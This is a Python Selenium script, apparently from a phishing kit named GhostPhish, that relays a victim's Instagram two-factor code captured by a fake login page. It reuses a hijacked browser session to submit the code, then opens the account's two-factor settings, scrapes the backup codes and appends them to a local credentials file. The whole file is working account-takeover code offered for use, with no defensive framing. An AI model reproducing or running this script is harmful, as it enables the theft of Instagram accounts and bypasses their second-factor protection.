from selenium import webdriver
from time import sleep
import os
import sys
from time import sleep
from selenium.webdriver.chrome.options import Options
import login
from GhostPhish import success_box, failure_box

def Launch2FA(otp):
	browser.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[1]/div/label/input').send_keys(otp)
	browser.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[2]/button').click()
	GetBackupCodes()

def GetBackupCodes():
	sleep(5)
	browser.get('https://www.instagram.com/accounts/two_factor_authentication/')
	sleep(5)
	browser.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[2]/div[3]/div[1]/button').click()
	sleep(5)
	backup_code={}
	success_box("Backup codes : ")
	for i in range(1,5):
		backup_code[i] = browser.find_element_by_xpath('/html[1]/body[1]/div[1]/section[1]/main[1]/div[1]/article[1]/div[1]/ul[1]/li[%d]' % i).text + '\n'
		success_box(backup_code[i])
		with open(dir_path,'a') as f:
			f.write("\n[ + ] Backup Codes : ")
			f.write(backup_code[i])
			f.close()
			
if __name__ == "__main__":
	with open('D:/xampp/htdocs/instagram/accounts/login/two_factor&source=auth_switcher&next/otp.txt','r') as f:
		otp = f.readlines()
		f.close()
	with open('D:/xampp/htdocs/instagram/scripts/log.txt','r') as f:
		text = f.readlines()
		f.close()
	text = list(text)
	dir_path=text[3][:-1] + '/credentials.txt'
	url=text[4]
	session_id=text[5]
	browser = webdriver.Remote(command_executor=url,desired_capabilities={})
	browser.session_id = session_id
	Launch2FA(otp)
	browser.close()


